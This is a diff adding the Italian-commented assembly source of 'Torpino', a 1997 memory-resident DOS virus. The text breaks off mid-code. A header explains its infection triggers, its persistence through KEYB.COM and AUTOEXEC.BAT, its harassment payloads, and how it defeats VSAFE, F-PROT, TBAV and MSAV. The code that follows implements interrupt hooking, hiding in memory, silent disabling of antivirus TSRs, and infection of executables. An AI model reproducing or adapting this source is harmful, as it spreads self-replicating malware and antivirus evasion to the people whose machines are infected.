@@ -1,0 +1,3696 @@
+﻿comment *
+=============================================================================
+Virus: TORPINO
+Dimensione: 11594 bytes
+Data: 24/12/1997
+Infezione: File COM ed EXE, residente in memoria
+Danni: Nessuno
+Disturbi: Molti
+Autori: Dr.SCSI & Mr.IDE
+Metodi di infezione: Esecuzione, Apertura, Creazione, Modifica attributi,
+                     Riga di comando, Ricerca, Rinomina, Copia.
+=============================================================================
+
+
+Descrizione:
+
+
+        Caricamento in memoria
+        ----------------------
+
+
+  Questo virus Š stato creato per funzionare anche sotto il DOS 7 di
+Windows'95, prima del caricamento, in finestra DOS e dopo l'uscita al DOS.
+  Per cui il Torpino controlla prima la versione del DOS: se Š uguale alla 7
+e accerta che Win 95 Š in esecuzione procede normalmente. Se Š in presenza
+del DOS 7 ma Win 95 non Š in esecuzione cerca di distiguere se si Š in fase
+di avvio del sistema oppure no: all'avvio, infatti non potrebbe caricarsi
+in memoria poichŠ l'MCB risulta essere marcato con M. Perci• ricerca nell'
+environment il nome del file che lo ospita: se corrisponde a WIN.COM o a
+KEYB.COM procede ugualmente all'installazione in memoria.
+  Per installarsi in memoria, il Torpino usa una tecnica presa dal virus
+Tentacle (chiamato dal Virus Scan della McAfee 'Tentatrickle').
+  Tramite l'MCB del progrmma infetto viene ricercato l'ultimo MCB allocato
+dal DOS: se Š occupato da un programma gi… residente si procede a calcolare
+la nuova posizione del blocco di memoria abbassandolo del numero di paragrafi
+del virus; se non Š presente nessun programma si procede senza ricalcolare
+l'ultimo MCB.
+  Chiamando il servizio 52h del int 21h si accede alle variabili di sistema;
+Viene a questo punto modificato il top della memoria impostandolo al valore
+del segmento che ospiter… il virus.
+  Si catturano tre interrupt: il 9 (handler della tastiera), l'1Ch (chiamato
+18,2 volte al secondo dall int 8 che gestisce il timer di sitema), e il 21h
+(kernel delle funzioni DOS).
+  Una volta spostato il codice del virus in memoria, si crea uno switch nei
+100h bytes prima dell'inizio del virus: servir… ad abilitare o disabilitare
+il controllo degli interrupt catturati da parte del virus. Ci• permette
+di risparmiare memoria in fase di infezione poichŠ non sar… necessaria una
+seconda copia del virus da criptare e scrivere nel programma vittima.
+
+
+        Funzioni anti-antivirus
+        -----------------------
+
+
+  VIRIT: criptando il codice il Virit muore immediatamente...
+
+
+  VSAFE: il Vsafe Š un programma di controllo del DOS contro i virus: tra
+le varie opzioni disponibili esiste quella che permette di disinstallarlo.
+  Al livello assembler questa opzione si attiva con una chiamata al
+DOS che evidentemente viene catturato dal Vsafe:
+
+
+        mov ax,0fa01h
+        mov dx,5945h
+        int 21h
+
+
+  Il Vsafe, in 'silenzio' si disinstalla.
+
+
+  F-PROT: la scansione non-euristica dell' F-PROT non d… nessun tipo di
+problema. Quella euristica si ferma con 5 istruzioni:
+
+
+        mov cx,2000       
+fp:     jmp fuck_fprot    
+        mov ax,4c00h      
+        int 21h           
+fuck_fprot: loop fp       
+
+
+  Si pu• vedere che le istruzioni mov ax,4c00h / int 21h (termina un
+programma) non saranno mai eseguite all'interno del loop di 2000 cicli:
+eppure il motore di ricerca euristica dell'F-PROT crede che il programma
+termini qui...
+  Altra caratteristica: se questo virus Š residente in memoria, quando si
+effettua una scansione con l'F-PROT, i file controllati vengono
+automaticamente infettati... Risultato: "Nessun virus di file/boot sector
+individuato".
+
+
+
+
+  TBAV: il ThunderByte Antivirus Š stato il pi— 'duro' da battere:
+il suo motore di ricerca euristica (creato interamente in assembler) Š
+'quasi' imbattibile: riesce a scoprire ogni piccola procedura sospetta all'
+interno dei programmi.
+  Dopo un mese di lavoro abbiamo scoperto un punto debole: non riesce
+a continuare la ricerca se il programma inizia con un salto far rilocato.
+  Questo difetto viene sfruttato dal Tentacle ma per il Torpino non Š una
+soluzione valida in quanto non Š applicabile ai file di tipo COM, che non
+possono essere rilocati.
+  La soluzione che invece abbiamo adottato induce all' <<esaurimento>>
+il Tbav: le scansioni euristiche NON eseguono i programmi che analizzano, ma
+ne simulano le istruzioni. Queste operazioni vengono effettuate in uno spazio
+di memoria non illimitato: cosa succede se l'emulazione richiede uno spazio
+eccessivo per essere portata a termine ? Il Tbav si ferma...
+  Per creare queste condizioni abbiamo criptato il virus ben 11 volte 
+portando il Tbav a scoprire un solo flag (#) che indica la presenza di
+codice di decriptazione: non pu• essere considerato come virus un
+programma che decripta dati in memoria.
+  La scansione euristica del Tbav viene cos� fermata, ma i moduli residenti
+che operano in background continuano a funzionare.
+  Per evitare che scoprano il tentativo del virus di intallarsi in memoria,
+prima che vengano catturati gli interrupt, si ricercano i moduli Tbav TSR e
+si disabilitano: non verr… segnalato niente all'utente.
+  In pi— il virus elimina i file ANTI-VIR.DAT creati dal TBAV per evitare
+che vengano riscontrati cambiamenti nei programmi.
+
+
+  MSAV: semplicemente viene cancellato il file CHKLST.MS se presente.
+La scansione non rileva questo virus, anzi, infetta i programmi che analizza!
+
+
+        Infezione dei file
+        ------------------
+  Questo virus Š in grado di infettare entrambi gli eseguibili DOS: COM ed
+EXE. Prima di tentare l'infezione si controlla lo spazio disponibile su disco.
+  Prima di infettare si crea un nuovo handler per l'INT 24h. Se il drive Š
+protetto da scrittura, non apparir… il solito messaggio DOS. Dopo l'infezione
+l'handler originale verr… ripristinato.
+  L'infezione dei COM avviene previo controllo della dimensione del file
+vittima: maggiore di 5 Kbyte e di dimensione non maggiore a FILE+VIRUS+256.
+  Per i file EXE i controlli sono maggiori: dimensione superire a 5 Kbyte,
+verifica che la dimensione dichiarata nell'header sia uguale a quella su
+disco, verifica che non si tratti di un EXE per Windows, verifica che il nome
+non corrisponda a quello degli antivirus (SCAN, CLEAN, F-PROT, ecc.).
+  Per infettare, si disabilitano gli interrrupt catturati tramite lo switch
+creato nel PSP del segmento di residenza, si cripta il virus, da una routine
+esterna, per 10 volte con chiave uguale a CHIAVE=CHIAVE+18h, si generano
+delle istruzioni polimorfiche e si cripta un'ultima volta il virus con chiave
+casuale. Quindi viene aggiornato l'header dell'EXE vittima e scritto il virus
+alla sua coda.
+  Al termine delle infezioni il virus si rimette in chiaro e riabilita gli
+interrupt catturati.
+  L'infezione avviene per tantissimi motivi: file eseguito, aperto,
+rinominato, CREATO. Quest'ultimo tipo di infezione Š unica al mondo: questo
+Š l'unico virus che infetta i file appena creato. Le conseguenze sono varie.
+Un file Š infettato appena creato con un compilatore qualsiasi, quando viene
+copiato (se il disco sorgente Š protetto da scrittura viene infettato solo il
+file-copia sul disco di destinazione), oppure estratto da un file zippato con
+un qualsiasi programma di compressione. Se, per caso, si infetta il programma
+SETUP.EXE o INSTALL.EXE di un disco di installazione all'insaputa dell'utente
+tutti i tentativi di reinstallare quel software produrranno copie infette.
+  L'infezione agisce anche a riga di comando. Alcuni esempi:
+  c:\>file.exe
+  c:\>dir file.exe
+  c:\>jkgdlfjgsd file.exe kjfgkldsj (il DOS dar… errore ma FILE sar… infetto)
+  c:\>attrib file.exe
+  Inoltre un file pu• essere infettato tramite una ricerca di file. Le
+ricerche vengono effetuate dai programmi per creare le tipiche finestre
+"Apri File.." come nell'EDIT, oppure all'avvio, come il DOSSHELL. Eseguendo
+perci• il DOSSHELL, automaticamente TUTTI i file dell'Hard Disk saranno
+infettati. Lo stesso accade con Windows 3.x: la vecchia versione di Windows,
+infatti, usa gli interrupt DOS e non ha un kernel di basso livello. Cos�,
+baster… lanciare il File Manager e tutti i file visualizzati verranno
+infettati.
+  Aggiungere a ci• la caratteristica che il virus infetta il file
+KEYB.COM ogni volta che si installa in memoria, cercandolo nelle tre
+directory C:\WINDOWS\COMMAND, C:\DOS e C:\. Cos� se, ad esempio, si esegue
+un file infetto da dischetto e si spegne immediatamente il computer,
+l'infezione si propagher… comunque alla prossima accensione, visto che
+KEYB.COM viene eseguito all'avvio dall'AUTOEXEC.BAT.
+  Se beccate questo virus...Auguri e Buon divertimento...
+
+
+        Effetti e disturbi
+        ------------------
+  Una volta entrato nel sistema il virus creer… un file: KEYB.SYS. Questo
+nome Š stato scelto poichŠ da una recente indagine americana, condotta
+da due illustri studiosi (noi due, ndr), Š emerso che la maggior parte degli
+utilizzatori di sistemi MS-DOS crede che il file KEYB.SYS appartenga ai file
+di sistema del DOS. Il virus ci scrive alcune frasi dentro e poi lo
+utilizza come contatore. Questo contatore verr… increnentato ad ogni
+esecuzione di un file infetto. Ad intervalli prestabiliti del contatore
+il virus attiver… un "iniettore di stronzate" che scriver… delle frasi, sensa
+senso per alcuni, nel file AUTOEXEC.BAT: questo fermer… l'avvio del PC e
+costringer… l'utente a leggerle.
+  Passato un p• di tempo si avvieranno le fasi di disturbo residenti. Notare
+che ogni disturbo sar… scelto a caso tra quelli disponibili, e inizier… ad
+agire dopo un intervallo variabile a caso da 10 a 30 minuti dopo l'esecuzione
+del primo file infetto. I disturbi sono divisi in due: un gruppo, quello pi—
+leggero, sar… attivato prima; poi, dopo che l'utente si sar… finalmente
+accorto della presenza del virus, partiranno qelli del secondo gruppo, pi—
+"velenosi". Da precisare che NESSUNO di essi provoca danni, come
+formattazioni o cancellazioni di file.
+  Questi sono i disturbi con una breve descrizione in modo che potrete
+riconoscerli quando sarete infetti (Š obbligatorio, ndr) da questo virus.
+
+
+  PRIMA FASE
+
+
+  TRE: Durante la digitazione se si batte una doppia, essa diventer…...
+una tripla: ES. scrivendo "latte" apparir… "lattte".
+
+
+  DUE: Come il precedente, con la differenza che le doppie diventeranno..
+singole: ES. scrivendo "latte" apparir… "late"
+
+
+  VOC: Circa ogni minuto verranno cambiate a caso le vocali sullo schermo.
+Un testo a video come questo, diverrebbe "On tusti e vudoa cumi qiesta".
+
+
+  NUM: Come il precedente, con la differenza che a cambiare sono i numeri.
+Uno sportello bancario sarebbe una vittima perfetta...
+
+
+  UFF: In maniera impercettibile, il sistema verr… rallentato. Il processo
+di rallentamento sar… cos� lento, che l'utente se ne accorger… dopo vari
+"Uff...". Il vostro potentissimo Pentium torner… alle origini
+dell'informatica trasformandosi in un fiammante Intel 8088.
+
+
+  BEEP: Che ne dite di ascoltare un beep ad ogni pressione di un tasto?
+
+
+  SBPLAY: E se invece di un beep fosse una nota a caso suonata dalla Sound
+Blaster?
+
+
+  SECONDA FASE
+
+
+  CAS: Vi ricordate il famoso "Cascade" ? No ?... Questo disturbo vi
+rinfrescher… la memoria: le lettere, una per una, cadranno come se si
+"scollassero" dal video e si ammucchieranno sul fondo una sull'altra.
+  A differenza del "Cascade" la caduta Š resa pi— reale simulando
+l'accelerazione di gravit… e non scompariranno sul fondo.
+
+
+  VIVO: All'improvviso un "verme" apparir… dall'angolo inferiore destro
+del video e comicer… a camminare sullo schermo mangiando i caratteri.
+  Una volta sazio, nascer… un "figlio" che seguir… i passi del padre. Se
+il cibo (i caratteri sullo schermo) "abbonder…", si potr… arrivare
+ad una "popolazione" di 20 vermi.
+
+
+  NOME: In una finestra rossa, ogni minuto, apparir… un messaggio col nome
+del virus ed in contemporanea la Sound Blaster eseguir… un "concerto" per
+l'utente.
+
+
+  INPIU: Verr… inserito, un carattere per volta, un messaggio nel buffer di
+tastiera che nella riga di comando DOS potr… provocare errori, e nei
+word processor sporcher… il file di testo.
+
+
+
+
+
+
+  Quasi tutti questi disturbi agiscono sotto DOS in modalit… testo. Se per•
+si passa in modalit… grafica il disturbo corrente ne attiver… uno che possa
+funzionare in questa modalit….
+  Esiste uno spiraglio di salvezza da questo virus: digitando una password
+in un qualsiasi momento e in qualsiasi programma, un beep avviser… che i
+disturbi sono sospesi...per il momento... Esiste anche la possibilit… di
+creare un file che "stoppi" i disturbi in un particolare computer...
+
+
+                                                In fede
+                                           Dr.SCSI and Mr.IDE
+*
+;------------------------Calcoli delle dimensioni----------------------------
+dimvirus    equ offset fine-offset inizio       ;dimensinoe virus
+virsect     equ dimvirus/512+1                  ;virus in settori
+dimdecry    equ offset chiaro-offset inizio     ;dimensione crypt
+parvirus    equ dimvirus/16+1                   ;paragrafi del virus
+parvir_2    equ parvirus+(dimout/16+1)+22       ;dimensione in memoria
+dimpspex    equ offset pspexfine-offset pspex   ;dimensione virus-psp
+dimout      equ offset endout-offset sout       ;dimensione esterna
+dimscuro    equ offset fine-offset scuro        ;dimensione caos
+dimcaos     equ offset en_scuro-offset st_scuro ;dimensione decry-caos
+dimfrase    equ offset frase_e-offset frasi     ;dimensione di una frase
+bufverme    equ offset end_verme-offset verme   ;dimensione di un verme
+;------------------------Variabili del contatore-----------------------------
+start_noise equ 1000     ; Valore di partenza dei disturbi
+fase2_noise equ 2000     ; Inizio seconda fase dei disturbi
+end_noise   equ 1000     ; Valore di interruzione dei disturbi
+pausa       equ 500      ; Pausa tra una attivazione e l'altra
+auto_start  equ 800      ; Partenza dell'autoexec.bat
+auto_act    equ 20       ; Cadenza delle scritture nell'autoexec.bat
+num_noise1  equ 3        ; Numero delle routines di disturbo fase 1
+num_noise2  equ 4        ; Numero delle routines di disturbo fase 2
+tasnoise    equ 3        ; Numero dei disturbi sostitutivi
+ritardo_M   equ 30*1092  ; Minuti di ritardo massimi dell'attivazione
+ritardo_x   equ 10*1092  ; Minuti di ritardo minimi dell'attivazione
+;--------------------Codici Sound Blaster delle note-------------------------
+C$ equ 16Bh              ; La scheda Sound Blaster
+D  equ 181h              ; richiede questi codici
+D$ equ 198h              ; per ogni nota che
+E  equ 1B0h              ; deve suonare.
+F  equ 1CAh              ; Verranno utilizzati
+F$ equ 1E5h              ; da NOISE_NOME.
+G  equ 202h     
+G$ equ 220h     
+A  equ 241h     
+A$ equ 263h     
+B  equ 287h     
+C  equ 2AEh     
+;----------------------------------------------------------------------------
+        .model tiny               ; Modello di memoria per COM
+        .code                     ; Inizio del segmento di codice
+        org 100h                  ; Partenza ad offset 100h
+;----------------------------------------------------------------------------
+inizio:                           ; Entry point
+;----------------------------------------------------------------------------
+k0: db 70 dup (90h)               ; Buffer per le istruzioni polimorfiche
+chiaro:                           ; Inizio decryptazione caos
+kk: db dimcaos*10 dup (90h)       ; Buffer per le istruzioni caos
+;------------------------Ricerca dell'offset attuale-------------------------
+scuro:  jmp real                  ; Inizio codice in chiaro
+        quanti2 dw 0              ; Doppia word fissa...
+        quanti1 dw 0              ; Conta chilometri............  
+real:   call qui                  ; Chiamata per ottenere l'offset corrente
+qui:    pop bp                    ; (per i file COM)
+        sub bp,offset qui         ; Calcolo dell'offset attuale
+        mov cs:[psp+bp],ds        ; Salvataggio indirizzo del psp
+;------------------------Anti F-PROT (...antivirus ?)------------------------
+        mov cx,2000               ; Loop inutile, con all'interno
+fp:     jmp fuck_fprot            ; un interrupt di terminazione.
+        mov ax,4c00h              ; Questo fermer… la scansione
+        int 21h                   ; euristica dell'F-PROT.
+fuck_fprot: loop fp               ;
+;-----------------------Chiamata alla routine "da terra"---------------------
+        call azione               ; Call per creare e/o aggiornare KEYB.SYS
+        call inizial              ; Call di inizializzazione delle variabili
+        mov cs:on_off+bp,0
+        call friend
+        cmp cs:contatore+bp,start_noise
+        jb auto_w                 ; Qui viene deciso quando
+        mov cs:on_off+bp,1        ; far partire i disturbi.
+        cmp cs:friends+bp,0
+        je nofrie
+        mov cs:on_off+bp,0
+        jmp auto_w
+nofrie: call random               ; Ottiene un numero a caso.
+        xor dx,dx                 
+        cmp cs:contatore+bp,fase2_noise
+        jb nof2                   ; Calcolo del numero
+        mov bx,num_noise2         ; e del ritardo
+        div bx                    ; dell'attivazione dei
+        add dx,num_noise1         ; disturbi.
+        jmp nod2                  
+nof2:   mov bx,num_noise1         
+        div bx
+nod2:   mov cs:disturbo+bp,dx
+auto_w: cmp cs:contatore+bp,auto_start
+        ja scrivi_auto            ; Se necessario si attiva
+        jmp no_auto               ; la scrittura nell' AUTOEXEC.BAT
+;------------------------Decisione di scrittura nell'AUT.BAT-----------------
+scrivi_auto:
+        cmp cs:friends+bp,0        ; Se si Š su un sistema
+        je nofri
+        jmp no_auto
+nofri:  mov cs:on_off+bp,0
+        mov ax,cs:contatore+bp    ; Calcolo del numero
+        xor dx,dx                 ; di frasi da
+        mov bx,auto_act           ; scrivere nell' AUTOEXEC.BAT
+        div bx
+        cmp dx,0
+        je ran_auto
+        jmp no_auto
+ran_auto:                         ; In questo punto si decide
+        call random               ; quale frase andra scritta
+        xor dx,dx                 ; nell'AUT.BAT
+        mov bx,6
+        div bx
+        call auto_in              ; Chiamata alle Sacre Scritture
+no_auto:
+;-----------------------Controllo presenza in memoria------------------------
+        mov dx,0918h              ; DX Š per ulteriore sicurezza
+        mov al,98h
+        mov ah,30h                ; Con la chiamata del servizio 3098h
+        int 21h                   ; dell' int 21h, si controlla che il 
+        cmp ax,0bcbch             ; virus non si sia gi… installato in
+        jne drvseek               ; memoria.
+        jmp nomem                 ; Altrimenti si torna alla vittima.
+;----------------------------------------------------------------------------
+        drv db "TBDRVXXX"         ; Modulo di supporto dei TSR ThunderByte
+            db "SCANX   "         ; Modulo di scansione dei file
+            db "TBCHKXXX"         ; Controllo dell'ANTI-VIR.DAT
+            db "TBMEMXXX"         ; Controllo della memoria
+            db "TBFILXXX"         ; Altro controllo dei file
+            db "TBDSKXXX"         ; Controlla l'accesso al disco diretto
+            db "TBLOGXXX"         ; Crea un report
+            ; Tutti questi moduli verranno disabilitati...
+drvseek:
+        push ds es                ; Ringraziamo l'autore del
+        push cs                   ; virus Tentacle per l'aiuto
+        pop ds                    ; involontario datoci per 
+        lea si,drv+bp      ; disabilitare il ThubderByte TSR.
+        call mem1                 ; Questa routine cerca in memoria
+        jc torna                  ; tutti i moduli del TBAV TSR
+        mov cx,6                  ; e li disabilita in modo
+cerca2: push cx                   ; assolutamente invisibile.
+        add si,8                  ; Da quel momento in poi
+        call mem1                 ; le utility TSR dormiranno
+        pop cx                    ; in memoria dando al TORPINO
+        jc rip                    ; la possibilit… di sguazzare
+        or byte ptr es:[16h],1    ; tra i file dell'hard disk.
+rip:    loop cerca2               ;
+torna:  pop es ds                 ; Thank You Tentacle!
+;------------------------Anti TBMEM...---------------------------------------
+        mov ax,0ca02h             ; Disabilita la ricerca di virus
+        xor bx,bx                 ; del modulo residente del
+        int 2fh                   ; Thunderbyte Antivirus.
+;------------------------Anti V-SAFE...--------------------------------------
+        mov ax,0fa01h             ; Il Virus ha bisogno di memoria...
+        mov dx,5945h              ; Potremmo scaricare dalla memoria
+        int 21h                   ; il V-SAFE ?
+;---------------------------------------------------------------------------
+        jmp hookint
+mem1:   mov ah,52h                ; Procedura chiamata
+        int 21h                   ; dal modulo di disattivazione
+        add bx,22h                ; dei TBAV TSR
+nontro: push si                   
+        lea di,[bx+0ah]           
+        mov cx,4
+        repz cmpsw                ; Ricerca in memoria
+        pop si                    ; attraverso tutti i TSR
+        jz trovat
+        les bx,es:[bx]
+        cmp bx,-1
+        jnz nontro
+        stc
+        ret
+trovat: mov ax,es
+        clc
+        ret
+;-----------------------Vettori originali degli interrupt-------------------
+        psp    dw ?               ; Zona di memoria
+        old_dos label dword       ; riservata per
+        dos1   dw ?               ; contenere gli indirizzi
+        dos2   dw ?               ; dei vettori d'interrupt
+        old_tim label dword       ; che verranno
+        tim1   dw ?               ; catturati dal virus.
+        tim2   dw ?               ; Le label servono per 
+        old_tas label dword       ; poter chiamare un indirizzo
+        tas1   dw ?               ; di tipo Far direttamente.
+        tas2   dw ?
+;-----------------------Salvataggio degli interrupt--------------------------
+hookint:
+        mov ah,30h                ; Controllo della versione DOS
+        int 21h
+        cmp al,7                  ; Se non Š 7 si procede normalmente
+        jne nowin95
+        mov ax,1600h              ; Controllo dell'esecuzione di Win 95
+        int 2fh
+        cmp al,4                  ; Se c'Š si procede normalmente
+        je nowin95
+        call ceckkey              ; Altrimenti si controlla il nome del file
+        jc nowin95                ; Se Š KEYB.COM o WIN.COM non si 
+        jmp catt                  ; controlla l'MCB e si installa comunque.
+nowin95:
+        mov ax,cs:[psp+bp]
+        dec ax                    ; Per poter installare se 
+        mov es,ax                 ; stesso in memoria, il virus
+        cmp byte ptr es:[0],'Z'   ; deve controllare che il
+        je catt                   ; proprio MCB sia marcato con Z
+        jmp nomem
+catt:   call friend
+        mov ax,3521h              ; Acquisizione degli indirizzi
+        int 21h                   ; degli interrupt 21h,09h,1Ch
+        mov cs:[dos1+bp],bx       ; e impostazione dei valori
+        mov cs:[ordosoff+bp],bx
+        mov cs:[dos2+bp],es
+        mov cs:[ordosseg+bp],es
+        sub al,5                  ; Qui vengono conservati
+        int 21h
+        mov cs:[tim1+bp],bx       ; i vecchi valori
+        mov cs:[ortimoff+bp],bx
+        mov cs:[tim2+bp],es       ; di offset e segmento
+        mov cs:[ortimseg+bp],es
+        sub al,13h                ; delle routines
+        int 21h
+        mov cs:[tas1+bp],bx       ; di interrupt originali
+        mov cs:[ortasoff+bp],bx
+        mov cs:[tas2+bp],es
+        mov cs:[ortasseg+bp],es
+;-----------------------Spostamento del codice in memoria--------------------        
+        mov ax,cs:[psp+bp]       ; Tecnica 'Tentacle':
+        dec ax                   ; l' MCB viene spostato
+        mov es,ax                ; in basso per il numero
+        inc ax                   ; di paragrafi necessari;
+        add ax,es:[3]            ; poi, tramite il servizio
+        mov es,ax                ; 52h del 21h viene ricercato
+        sub ax,parvir_2          ; il limite massimo della memoria
+        mov bl,byte ptr es:[0]   ; visto dal Dos e viene sostituito
+        sub bl,4eh               ; dal nuovo valore.
+        inc bl                   ; Il PSP e l'MCB vegono aggiornati.
+        je tent                  ; Con questo metodo il virus
+        mov es,ax                ; si installa in memoria in modo
+        mov ax,cs:[psp+bp]       ; assolutamente invisibile e sicuro.
+        dec ax
+        mov ds,ax
+        sub word ptr ds:[3],parvir_2
+        sub word ptr ds:[12h],parvir_2
+        mov ax,es
+        inc ax
+        mov es,ax
+        jmp sposta
+tent:   push ds
+        push es
+        pop ds
+        mov es,ax
+        mov cx,16
+        xor si,si                ; Sposta l'MCB trovato in basso
+        mov di,si
+        rep movsb
+        add word ptr es:[3],parvir_2
+        pop ax
+        dec ax
+        mov ds,ax
+        sub word ptr ds:[3],parvir_2
+        sub word ptr ds:[12h],parvir_2
+        push es
+        mov ah,52h               ; Cerca la "List Of List"
+        int 21h                  ; o "Sysvars" del DOS
+        pop ax
+        les bx,es:[bx+12h]
+        mov es:[bx+1fh],ax
+        inc ax
+        mov es,ax
+sposta: push cs                   ; Quando si sposta il codice in memoria
+        pop ds                    ; viene anche impostato lo switch dei
+        mov cx,dimvirus           ; vettori e la routine esterna.
+        mov di,100h
+        lea si,inizio+bp
+        rep movsb
+        mov cx,dimout
+        lea si,sout+bp
+        rep movsb
+        cmp cs:beep_on+bp,0
+        je nobeep1                ;  **************
+        mov ax,0e07h              ;  beep beep beep
+        int 10h                   ;
+        int 10h                   ;
+        int 10h                   ;  **************
+nobeep1:                          ;
+;-----------------------Settaggio degli "interruttori"-----------------------
+        mov cs:[newdos+bp],offset mydos-3-18h
+        mov cs:[newtim+bp],offset mytim-3-28h
+        mov cs:[newtas+bp],offset mytas-3-38h
+;-----------------------Spostamento dello switch in memoria------------------
+        push cs                   ; Le istruzioni
+        pop ds                    ; dello switch non possono
+        lea si,pspex+bp  ; essere compilati direttamente:
+        mov di,10h                ; Verranno spostati nel PSP
+        mov cx,dimpspex           ; del virus manualmente.
+        rep movsb                 
+;-----------------------Cattura degli interrupt 21 1C 09---------------------
+        push es                 ; Ora i vettori 21h, 1Ch e 09h
+        pop ds                  ; punteranno rispettivamente
+        mov ax,2521h            ; agli offset 10h, 20h e 30h del
+        mov dx,10h              ; segmento su cui Š stato copiato il 
+        int 21h                 ; virus precedentemente.
+        sub al,5
+        mov dx,20h
+        int 21h
+        sub al,13h
+        mov dx,30h 
+        int 21h                 ;********************
+        jmp sikeyb
+                                ;********************
+;-----------------------Controllo Friend-system------------------------------
+        sernome db 'C:\TORPASS.DAT',0
+        passbuf db 4 dup(0)
+        beep_on db 0
+        serbuf  dw 0
+        serial  db 4 dup(0)
+                db 11+8 dup(0)
+        friends db 0
+friend: mov cs:friends+bp,0
+        mov cs:beep_on,0
+        lea dx,sernome+bp
+        push cs                 ; Se nella root
+        pop ds
+        mov ax,3d00h            ; Š presente un file
+        int 21h
+        jnc pres                ; di nome TORPASS.DAT
+        ret
+pres:   mov bx,ax               ; lo si apre,
+        mov cx,5
+        mov ah,3fh              ; e se al suo interno
+        lea dx,passbuf+bp
+        int 21h                 ; Š presente il
+        mov ah,3eh
+        int 21h                 ; numero di serie
+        mov ax,6900h
+        mov bx,3                ; dell'Hard Disk
+        lea dx,serbuf+bp
+        int 21h                 ; del sistema,
+        jnc serok
+        ret                     ; non verranno attivati
+serok:  push cs
+        pop es                  ; i disturbi e
+        lea di,passbuf+bp
+        lea si,serial+bp        ; si passa nella
+        mov cx,4
+        repe cmpsb              ; modalit… "friend".
+        je friendok
+        mov cs:friends+bp,0
+        ret
+friendok:
+        mov cs:friends+bp,1
+        ret
+;-----------------------Controllo del file in esecuzione---------------------
+        nome1 db 'KEYB.COM'
+        nome2 db 'WIN.COM'
+ceckkey:
+        cld
+        mov es,cs:[psp+bp]      ; Acquisisce il PSP
+        mov ax,es:[2ch]         ; Trova l'environment
+        mov es,ax
+        xor di,di
+        mov cx,7fffh
+        xor ax,ax
+namesc: repne scasb             ; Cerca le stringe ASCIIZ
+        cmp byte ptr es:[di],1
+        jne namesc
+        add di,2
+        repne scasb             ; Cerca la fine del nome del file
+        sub di,9
+        push cs
+        pop ds
+        lea si,nome1+bp
+        mov cx,8
+        call compara_nome       ; Lo confronta con KEYB.COM
+        je nomeok
+        lea si,nome2+bp
+        mov cx,7
+        inc di
+        call compara_nome       ; Oppure con WIN.COM
+        je nomeok
+        stc
+        ret
+nomeok: clc                     ; Se corrispondono setta il carry
+        ret
+compara_nome:
+        push di    
+        repe cmpsb
+        pop di
+        ret
+;-----------------------Infezione forzata del KEYB.COM-----------------------
+        kbc1 db 'C:\WINDOWS\COMMAND\KEYB.COM',0
+        kbc2 db 'C:\DOS\KEYB.COM',0
+        kbc3 db 'C:\KEYB.COM',0
+sikeyb: lea dx,kbc1+bp
+        call openk              ; Il file Keyb.com viene aperto e
+        lea dx,kbc2+bp ; richiuso nelle tre directory
+        call openk              ; apparentememte senza motivo...
+        lea dx,kbc3+bp ; Eh... eh... eh...
+        call openk
+        jmp nomem
+openk:  mov ax,3d00h
+        int 21h
+        jc noop
+        mov bx,ax
+        mov ah,3eh
+        int 21h
+noop:   ret
+nomem:
+;-----------------------Siamo in un file COM o EXE ?-------------------------
+        cmp cs:[com_exe+bp],0   ; Il ritorno alla vittima
+        je  torna_com           ; Š diverso a seconda del file
+        jmp torna_exe           ; che contiene il virus
+;-----------------------Vecchi valori da ripristinare------------------------
+        com_exe  db 0             ; Qui vengono salvati 
+        cop_jmp  db 90h           ; i valori della vittima 
+        ope_jmp  dw 20cdh         ; che dovranno essere
+        marca    dw 0918h         ; ripristinati
+        exe_vittima label dword
+        old_ip   dw ?
+        old_cs   dw ?
+        old_sp   dw ?
+        old_ss   dw ?
+;-----------------------Ritorno ad una vittima COM---------------------------
+torna_com:                         ; Per tornare da
+        mov ds,cs:[psp+bp]         ; un file COM
+        push ds                    ; bisogna ripristinare i primi
+        pop es                     ; 3 bytes, poi la word usata
+        mov al,cs:[cop_jmp+bp]     ; come marcatore ed infine saltare
+        mov byte ptr cs:[100h],al  ; all'indirizzo 100h
+        mov ax,cs:[ope_jmp+bp]
+        mov word ptr cs:[101h],ax
+        mov ax,cs:[marca+bp]
+        mov word ptr cs:[112h],ax
+        xor bx,bx
+        xor dx,dx                  ; Azzeriamo tutti i registri
+        xor bp,bp
+        xor si,si                  ; per pulizia, prima di 
+        xor di,di
+        xor ax,ax                  ; restituire la "linea" alla
+        mov cx,100h
+        jmp cx                     ; vittima (offset 100h)
+;-----------------------Ritorno ad una vittima EXE---------------------------
+torna_exe:
+        mov ax,cs:[psp+bp]         ; Per tornare da un file EXE
+        mov ds,ax                  ; si deve rilocare il vecchio
+        mov es,ax                  ; entry-point, spostare e rilocare
+        add ax,10h                 ; lo stack ed infine eseguire 
+        add cs:[old_cs+bp],ax      ; un jmp far al vecchio CS:IP
+        add ax,cs:[old_ss+bp]
+        xor bx,bx
+        xor cx,cx                  ; Idem come per i file
+        xor dx,dx
+        xor bp,bp                  ; COM, si azzerano i registri,
+        xor si,si
+        xor di,di                  ; ma in un file EXE
+        cli
+        mov sp,cs:[old_sp+bp]      ; Š necessario anche rilocare
+        mov ss,ax
+        xor ax,ax                  ; lo Stack al suo valore originale
+        sti
+        jmp cs:[exe_vittima+bp]
+;-----------------------Azione "terrestre"-----------------------------------
+        keyb1   db 'C:\WINDOWS\KEYB.SYS',0
+        keyb2   db 'C:\DOS\KEYB.SYS',0
+        keyb3   db 'C:\KEYB.SYS',0
+        avviso  db 'Do not modify this file!',13,10,13,10
+        dati    db 'keyboard=1,0,'
+        byte_k  db '0'
+        linea   db  13,10,13,10
+        para    dw ?
+;-----------------------Tentativi di apertura e/o creazione KEYB.SYS---------
+azione: push cs
+        pop ds                    ; Per ogni 
+        mov cs:para+bp,3d02h
+        lea dx,[keyb1+bp]         ; directory
+        call tenta
+        jnc leggi                 ; memorizzata qui
+        lea dx,[keyb2+bp]
+        call tenta                ; sopra, si
+        jnc leggi
+        lea dx,[keyb3+bp]         ; cerca di aprire
+        call tenta
+        jnc leggi                 ; il file KEYB.SYS.
+        jmp crea_keyb
+        ret                       ; Se non c'Š
+tenta:  mov ax,cs:para+bp
+        int 21h                   ; ne viene
+        ret
+crea_keyb:                        ; creato uno nuovo
+        mov cs:para+bp,3c00h
+        mov cx,20h                ; in una delle
+        lea dx,[keyb1+bp]
+        call tenta                ; tre directory
+        jnc scrivi_keyb
+        lea dx,[keyb2+bp]         ; e viene riempito
+        call tenta
+        jnc scrivi_keyb           ; con una
+        lea dx,[keyb3+bp]
+        call tenta                ; frase ASCII.
